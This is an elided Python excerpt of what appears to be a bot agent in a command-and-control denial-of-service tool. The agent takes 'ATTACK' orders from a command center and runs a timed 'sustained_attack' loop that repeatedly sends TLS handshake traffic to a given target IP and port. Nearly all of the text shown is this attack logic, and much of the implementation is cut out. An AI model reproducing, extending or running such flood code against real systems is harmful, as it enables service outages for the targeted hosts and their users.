...
class AgentInstance:
        ...
        while message:
            ...
            if "ATTACK" in message and self.COMMAND_CENTER:
                ...
                try:
                    ...
                    if "ATTACKDURATION" in message:
                        # Check if there is a sustained attack duration parameter so we can switch the logic flow else start the normal attack
                        print("\033[1;95mStarting sustained attack for ", message['ATTACKDURATION'], " minutes")
                        self.sustained_attack(IP=message['TARGET'], PORT=message['PORT'], HITS=message['HITS'], CIPHER=message['CIPHER'], PROTOCOL=message['PROTOCOL'], SSLCONTEXT=message['SSLCONTEXT'], ATTACKDURATION=message['ATTACKDURATION'])
                    else:
    ...
    def sustained_attack(self, IP, PORT, HITS, CIPHER, PROTOCOL, SSLCONTEXT, ATTACKDURATION, data=b"Handshake Message"):
        # for the amount of minutes specified in the GUI, keep attacking based on the parameters given
        attack_duration = ATTACKDURATION * 60  # convert minutes to seconds
        end_time = time.time() + attack_duration

        while time.time() < end_time:
            self.send_attack(IP, PORT, HITS, CIPHER, PROTOCOL, SSLCONTEXT, data)
            time.sleep(1)  # sleep for a while before the next attack
            print(f"{time.ctime()} Sending next attack..")
